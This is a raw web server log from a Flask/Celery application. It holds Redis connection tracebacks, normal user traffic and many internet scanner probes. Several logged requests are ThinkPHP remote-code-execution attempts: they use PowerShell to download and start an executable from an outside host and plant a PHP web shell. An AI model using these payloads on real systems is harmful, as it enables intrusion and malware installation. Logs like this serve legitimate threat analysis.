  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:36:29] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:37:09] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:37:28,768] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:37:28] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:49] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:49] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:51] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:52] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:52] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:39:51] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:00] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:00] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:03] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:09] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:09] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:08] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:22] "[37mOPTIONS /logout HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:22] "[37mPOST /logout HTTP/1.1[0m" 200 -
64.62.197.92 - - [21/May/2021 14:17:26] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [21/May/2021 17:37:19] "[33mHEAD / HTTP/1.0[0m" 404 -
113.57.237.25 - - [21/May/2021 19:12:02] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:02] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:03] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:05] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:05] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:09] "[37mOPTIONS /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:09] "[37mPOST /consoleLog HTTP/1.1[0m" 200 -
45.148.10.50 - - [22/May/2021 01:00:40] "[33mHEAD / HTTP/1.0[0m" 404 -
74.120.14.40 - - [22/May/2021 01:16:34] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.40 - - [22/May/2021 01:16:36] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [22/May/2021 01:22:11] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [22/May/2021 02:01:38] "[33mHEAD / HTTP/1.0[0m" 404 -
162.142.125.56 - - [22/May/2021 02:22:39] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.56 - - [22/May/2021 02:22:40] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
88.5.238.31 - - [22/May/2021 04:08:37] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [22/May/2021 04:24:30] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [22/May/2021 04:27:22] "[33mHEAD / HTTP/1.0[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:06] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:09] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:20] code 400, message Bad request syntax ('\x03\x07\x19Â¨`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
193.37.255.114 - - [22/May/2021 04:33:20] "[35m[1mÂ¨`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [0m" HTTPStatus.BAD_REQUEST -
34.76.80.167 - - [22/May/2021 04:33:56] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.5 - - [22/May/2021 05:32:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.5 - - [22/May/2021 05:32:22] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.148.10.50 - - [22/May/2021 07:51:20] "[33mHEAD / HTTP/1.0[0m" 404 -
185.167.96.236 - - [22/May/2021 08:16:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Â¥\x00Â«Ã!Ã°JÃ«zÃR7Â±\x9d\x8d[\x03Ã«\x15Ã¼\x0fÂ±IKÂ£Ã{\x14`ÃÃÃ·\x00\x00\x1aÃ/Ã+Ã\x11Ã\x07Ã\x13Ã')
185.167.96.236 - - [22/May/2021 08:16:33] "[35m[1m {  wÂ¥ Â«Ã!Ã°JÃ«zÃR7Â±ÂÂ[Ã«Ã¼Â±IKÂ£Ã{`ÃÃÃ·  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [22/May/2021 08:21:20] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [22/May/2021 08:21:23] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [22/May/2021 08:21:23] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [22/May/2021 08:22:44] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [22/May/2021 08:22:44] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
220.200.158.243 - - [22/May/2021 08:22:48] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
220.200.158.243 - - [22/May/2021 08:22:48] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
185.153.199.107 - - [22/May/2021 09:41:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.153.199.107 - - [22/May/2021 09:41:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 10:42:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 10:42:32] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.153.199.107 - - [22/May/2021 10:49:37] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.153.199.107 - - [22/May/2021 10:49:37] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.118.53.210 - - [22/May/2021 11:25:29] "[33mGET / HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /struts2-rest-showcase/orders.xhtml HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /index.action HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /index.do HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://UeR.ReiyKiQ.ir/download.exe','%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe');start%20%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://UeR.ReiyKiQ.ir/download.exe','%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe');start%20%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe HTTP/1.1[0m" 404 -
104.206.128.74 - - [22/May/2021 14:39:59] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [22/May/2021 15:28:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 15:28:35] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [22/May/2021 16:04:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [22/May/2021 16:04:08] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 17:52:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 17:52:20] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 19:56:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 19:56:43] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:01:56] code 400, message Bad request syntax ('{\x01\x00\x1615888888888ÃÂ¨\x90Ã\x13\x8a{')
161.189.192.94 - - [22/May/2021 20:01:56] "[35m[1m{ 15888888888ÃÂ¨ÂÃÂ{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:08:08] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [22/May/2021 20:08:08] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:12:45] code 400, message Bad request syntax ('&&&&~\x04Â»8ÃaÃ½T\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [22/May/2021 20:12:45] "[35m[1m&&&&~Â»8ÃaÃ½TP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:27:57] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.134.11 - - [22/May/2021 20:27:57] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:33:04] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03Â¥-~')
161.189.192.94 - - [22/May/2021 20:33:04] "[35m[1m~   ÂÂÂÂÂÂ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:37:48] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.134.11 - - [22/May/2021 20:37:48] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:41:48] code 400, message Bad HTTP/0.9 request type ('\x02Â¤UÃ¿\x00\x00\x00')
161.189.192.94 - - [22/May/2021 20:41:48] "[35m[1mÂ¤UÃ¿   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:45:10] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÃ')
161.189.192.94 - - [22/May/2021 20:45:10] "[35m[1m~~ 4Vx4/  YQkÃ[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:52:08] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
